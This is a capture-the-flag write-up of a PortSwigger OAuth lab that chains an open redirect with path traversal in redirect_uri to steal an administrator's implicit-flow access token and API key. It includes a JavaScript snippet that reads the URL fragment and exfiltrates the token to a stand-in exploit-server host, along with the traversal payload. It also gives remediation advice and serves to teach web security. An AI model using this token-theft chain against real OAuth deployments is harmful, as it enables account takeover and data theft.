# Lab: Stealing OAuth Access Tokens via an Open Redirect

| Field | Details |
|-------|---------|
| **Provider** | PortSwigger |
| **Difficulty** | Practitioner |
| **Category** | OAuth |
| **Date** | 2026-08-08 |

---

## Summary

Stealing OAuth access tokens via an open redirect is a lab in the PortSwigger Web Security Academy.
In this lab, account management and login is handled through an OAuth provider.
However, there is a vulnerability in the flow and we have to discover it.
The task is to get the administrator's API key — it cannot be accessed directly from their account, but there is an endpoint that returns user PII including the key.

In this writeup I'll solve this challenge manually, step by step.

![image](images/1-labinfo.png)

---

## Reconnaissance

The target is a normal-looking weblog where people can log into their accounts, post images, and leave comments on posts.

![image](images/2-blog.png)

I clicked on the "My Account" button on the main page to log in using the given credentials.
After clicking, I got redirected to another site.
We know that a site cannot set cookies for another origin, so if the login happens on one site and the workflow is on another, authentication must be transferable between these two origins.
This is the general concept of federated identity — there is an authentication provider, and applications consume the token it issues.

OAuth (Open Authorization) is a protocol designed for this purpose.
It's often referred to as a pseudo-authentication protocol.
There is a provider where you enter your credentials and log in, and there is a scope that specifies which information the application can access, such as name, email, profile picture, age, etc.
A token is then generated for the user, who carries it to the application that needs it for authentication.

How does the user know where to deliver the token or code?
There are a few possibilities:
1. In OAuth, there is a `redirect_uri` parameter that holds the callback address.
2. In transfer flows generally, there might be a redirect URI callback to deliver the token, a server-side confirmation request, or other mechanisms like JSONP calls, top-level cookies, or CORS.

<br>

So I entered my credentials (`wiener:peter`) to log in:

![image](images/3-oauthLogin.png)

The provider then asked me which items I want to allow the application to access:

![image](images/4-scope.png)

I clicked "Continue" and got redirected back to the application via the callback.
There was a message saying: "You have successfully logged in with your social media account."

<br>

I moved to Burp to understand the authentication flow in detail.
The first request was a GET to `/social-login`, which redirected me to the provider's website.

![image](images/5-redirectionToProvider.png)

The second request was a GET to `/auth` on `oauth-server.net` with the following parameters:
- `client_id` — the application's identifier
- `redirect_uri` — the address to redirect back to after authorization
- `response_type` — the type of response the application expects (typically `code` or `token`)
- `scope` — the data the application is requesting access to

This is clearly OAuth — the provider is a known OAuth server and the parameters match the protocol exactly.
The only thing missing is `state`, which acts as a CSRF token in OAuth flows.

![image](images/6-oauthCall.png)

The response redirected me to a path which I believed was an interaction endpoint to collect credentials.
That turned out to be correct — my next important request was a POST to that path, including my credentials.

![image](images/7-postingCredentials.png)

Followed by a GET request to the same path, which redirected me back to `/oauth-callback` on the application.

> Notice that the token is being sent in a fragment, so it will never reach the server — it has to be handled on the browser side.
> What does that mean? JavaScript.
> So there has to be a piece of code to extract the token and handle it.

![image](images/8-redirectBackToApp.png)

The final request was a GET to `/oauth-callback` on the application, carrying the authorization token in the URL fragment.
As visible in the response, there is a JavaScript snippet to handle the token.
The application first parses `window.location.hash.substr(1)` — the entire fragment excluding the `#` sign.
Then it extracts the `access_token` and sends a request to `/me` on the server using it as a Bearer token.
After that, it POSTs the received information to `/authenticate` and the authentication flow completes.

![image](images/9-whatAppDoesToResponse.png)

So the user got redirected back to the application using the address in `redirect_uri`, carrying the token in the fragment.
This is exactly how the OAuth implicit flow works.

<br>

What happens if the `redirect_uri` points to a page under an attacker's control?
Since the token arrives in the fragment and is processed by JavaScript, an attacker-controlled page can read `window.location.hash` and exfiltrate the token to their server.

---

## Exploitation

I sent the OAuth authorization request to Repeater to see if I could manipulate it.
There is a rule I follow: always start with the least impactful change, so you can isolate the cause if something breaks or gets blocked.

I only changed the path of the `redirect_uri` parameter and immediately got a `400 Bad Request` error.

![image](images/10-changingOathCallRedirectURI.png)

So I knew that even a small path change breaks the request, and I cannot replace the entire URL with mine.
The next step was searching the app for an open redirect — so I can redirect the user through a legitimate path and chain it to my server.

<br>

In the Posts section, each post has a "next post" link that performs a redirect.

![image](images/11-redirections.png)

I captured that request and tested it in Repeater by replacing the relative path with an absolute URL pointing to `https://example.com`.
The response was a `302`, and following the redirect landed me on `example.com`.
This is an open redirect.

![image](images/12-openRedirect.png)
![image](images/13-ORconfirmed.png)

<br>

I tried substituting this path into the OAuth `redirect_uri` — and got `400` again.

![image](images/14-regexOrWhatever.png)

The validator appeared to be checking that `/oauth-callback` comes immediately after the hostname.
However, if path traversal is possible and the address is not resolved before the check, the validation can be bypassed:

![image](images/15-pathTeraversal.png)

That returned `200` — the provider accepted it, meaning the redirect will now follow the manipulated path.

I wrote a first version of the exploit and delivered it to the victim — just a redirect to the vulnerable URL, with no token extraction yet.
This was purely a confirmation step.

![image](images/16-exploit.png)

<br>

Checking the access logs confirmed the link was clicked and requests were arriving.

![image](images/17-OOBbutWithoutToken.png)

With the method confirmed, the only remaining step was completing the exploit with token extraction:

```javascript
if (window.location.hash) {
    const token = new URLSearchParams(window.location.hash.substr(1)).get('access_token');
    fetch(`https://exploitServer.tld/exploit?victimToken=${token}`);
} else {
    window.location = "https://oauth-server-address.tld/auth?client_id=.... <vulnerable page>"
}
```

![image](images/18-extractingFromFragment.png)

<br>

The `victimToken` parameter arrived in the access log containing the actual token.

![image](images/19-gotTheToken.png)

The last step was finding where the API key lives.
In the normal flow, the API key is returned in the response of a GET request to `/me`, with the `Authorization` header set to the Bearer token.

![image](images/20-whatComesNext.png)

I copied that request and replaced the token with the administrator's stolen access token.

![image](images/21-replacingToken.png)

<br>

And submitted the flag.

![image](images/22-submittingFlagAPIKEY.png)

---

## Result

The lab was solved. The OAuth provider uses the implicit flow — issuing an access token directly in the URL fragment instead of an authorization code. The `redirect_uri` validation was strict enough to block arbitrary external hosts, but failed to account for path traversal combined with an open redirect on the client application. By chaining these two weaknesses — `/oauth-callback/../post/next?path=attacker-server` — the token was delivered to the attacker's server inside the fragment. A single JavaScript snippet read `window.location.hash`, extracted the access token, and exfiltrated it via a GET request. The stolen token was then used directly against the `/me` endpoint to retrieve the administrator's API key — no credentials, no session, no interaction beyond clicking a link.

![image](images/23-done.png)

---

## Impact & Remediation

**Impact**

This vulnerability allows a complete theft of any user's OAuth access token — including privileged accounts — through a chain of two weaknesses: a loose `redirect_uri` path validation and an open redirect on the client application.
No credentials are required. The attacker only needs to deliver a crafted URL to the victim, who is silently redirected through the OAuth flow and back to the attacker's page with the token in the URL fragment.
Because the implicit flow delivers the access token directly — rather than an authorization code that requires a secondary exchange — there is no additional verification step. The stolen token grants immediate API access.
In this lab, this translated to full access to the administrator's identity data and API key via the `/me` endpoint.

**Remediation**

- **Avoid the implicit flow**: The OAuth implicit flow (`response_type=token`) delivers access tokens directly in the URL fragment with no opportunity for verification. Use the authorization code flow with PKCE instead — tokens are never exposed in the URL.
- **Enforce strict redirect_uri validation**: The provider must validate the full resolved path against an exact allowlist — after decoding and resolving any traversal sequences. A check against the raw string before normalization is bypassable with `/../` tricks.
- **Fix the open redirect**: The `path` parameter in the `/post/next` endpoint must be restricted to relative paths or validated against an allowlist of permitted destinations. Accepting arbitrary absolute URLs is an open redirect regardless of OAuth context.
- **Implement the `state` parameter**: The absence of `state` removes CSRF protection from the OAuth flow. A cryptographically random, session-bound `state` value should be validated on every callback.
- **Short-lived access tokens**: Tokens should expire quickly and be scoped to the minimum required permissions — limiting the window and impact of any token theft.

---

## Takeaway

This lab demonstrates that strict `redirect_uri` validation alone is not sufficient if the application itself contains an open redirect.
The attacker doesn't need to escape to an external host — they only need to find a redirect gadget within the allowed domain and chain it outward.

The implicit flow makes this significantly worse. With the authorization code flow, stealing the redirect only gives you a code — which still requires a client secret to exchange. With the implicit flow, the token is right there in the fragment, readable by any JavaScript on the landing page.

The key insight here is that path traversal in `redirect_uri` is a classic bypass for allowlist validators that check the raw string before resolving the path. Always normalize and fully resolve URLs before comparing them against any allowlist.

When assessing OAuth implementations, always test: open redirects on the client domain, path traversal in `redirect_uri`, and the `response_type` in use — because the implicit flow turns any redirect gadget into a token theft primitive.